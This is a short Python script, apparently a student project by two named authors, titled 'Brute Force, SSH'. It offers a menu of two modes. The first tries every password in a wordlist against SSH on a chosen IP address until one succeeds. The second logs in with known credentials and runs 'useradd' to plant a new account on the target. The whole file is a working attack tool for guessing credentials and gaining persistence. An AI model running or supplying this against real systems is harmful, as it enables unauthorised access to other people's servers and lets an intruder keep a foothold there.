#!/usr/bin/python3
# Nick Alderete & Andrew Perry
# Brute Force, SSHfrom netmiko import ConnectHandler# Get user input




import time
from netmiko import ConnectHandler




# Establish SSH connection
def mode1():
    ip_address = input("Enter the IP address: ")
    password_file = input("Enter the file path for the password file: ")
    username = input("Enter the username: ")
    # Read passwords from the file
    with open(password_file, 'r') as file:
        passwords = file.readlines()
    passwords = [password.strip() for password in passwords]
    # SSH connection parameters
    device = {
        'device_type': 'linux',
        'ip': ip_address,
        'username': username,
        'password': '',
        'port': 22,
    }
    # Establish SSH connection for each password
    for password in passwords:
        device['password'] = password
        try:
            connection = ConnectHandler(**device)
            print(f"SSH connection successful with password: {password}")
            # Perform actions on the Linux server using the connection
            # For example, execute commands: connection.send_command('command')
            connection.disconnect()
            break  # Exit the loop if successful connection is established
        except Exception as e:
            print(f"SSH connection failed with password: {password}")


# Create new user inside SSH session
def mode2():
    # Credentials for authentication for SSH session
    username = input("Enter the username: ")
    password = input("Enter the password: ")
    host = input("Enter the host IP address: ")

    device = {
        'device_type': 'linux',
        'ip': host,
        'username': username,
        'password': password,
    }

    try:
        net_connect = ConnectHandler(**device)
        print("Connected successfully!")
    except Exception as e:
        print("Failed to connect:", str(e))
        exit(1)
    # For adding a new user
    new_username = input("Enter the new username: ")
    new_password = input("Enter the new password: ")
    command = f"useradd {new_username}"

    try:
        output = net_connect.send_command(command)
        print("User created successfully!")
    except Exception as e:
        print("Failed to create user:", str(e))

    net_connect.disconnect()

# User menu     
while True:
    print("~ Options ~")
    print("1. Create an SSH connection.")
    print("2. Create a user at a destination.")
    print("3. Exit")

    answer = input("Make a selection (1-3): ")

    if answer == "1":
        print("\nStarting SSH Connection.\n")
        mode1()
        break
    elif answer == "2":
        print("\nLet's create a new user.\n")
        mode2()
        break
    elif answer == "3":
        print("Exiting program...")
        time.sleep(2)
        break

# END 